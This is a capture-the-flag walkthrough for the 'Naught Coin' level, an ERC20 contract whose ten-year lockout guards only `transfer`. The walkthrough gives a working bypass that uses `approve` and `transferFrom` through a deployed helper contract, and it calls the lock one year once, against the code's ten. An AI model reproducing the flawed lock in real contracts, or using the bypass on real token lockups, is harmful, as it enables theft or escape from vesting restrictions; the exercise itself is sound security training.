# Naught Coin

## Challenge Description

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

Things that might help

-   The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
-   The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

## Challenge Solution Walkthrough

In this contract, there is a requirement to wait for one year before being able to withdraw funds. However, we can bypass this waiting period by granting access to another address to withdraw the funds on our behalf, allowing us to spend them immediately. This can be achieved by utilizing the `approve` and `transferFrom` functions inherited from the `ERC20` contract.

The `ERC20` contract provides two important functions:

```solidity
function approve(
    address spender,
    uint256 amount
) public virtual override returns (bool) {
    address owner = _msgSender();
    _approve(owner, spender, amount);
    return true;
}

function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
}
```

These functions allow us to authorize another address to spend our funds. First, we use the `approve` function to grant permission for another address to withdraw the funds. Then, we use the `transferFrom` function to initiate the actual withdrawal.

To accomplish this, we can deploy the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract NaughtCoinSolution {
    NaughtCoin public naughtCoin;

    constructor(address naughtCoinAddress) {
        naughtCoin = NaughtCoin(naughtCoinAddress);
    }

    function solveChallenge() public {
        naughtCoin.transferFrom(
            msg.sender,
            address(this),
            naughtCoin.balanceOf(msg.sender)
        );
    }
}
```

By calling the `solveChallenge()` function in this deployed contract, we can withdraw the funds. However, prior to executing this function, we need to grant approval to the contract address, `0x69717414089c2E786BcE24846A55D4C3756908Ee`, allowing it to withdraw the funds. This approval can be obtained through the console using the following commands:

```javascript
> const totalValue = await contract.balanceOf(player)
> await contract.approve("0x69717414089c2E786BcE24846A55D4C3756908Ee", totalValue)
```

Finally, we can proceed to call the `solveChallenge()` function in the deployed contract to withdraw the funds.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
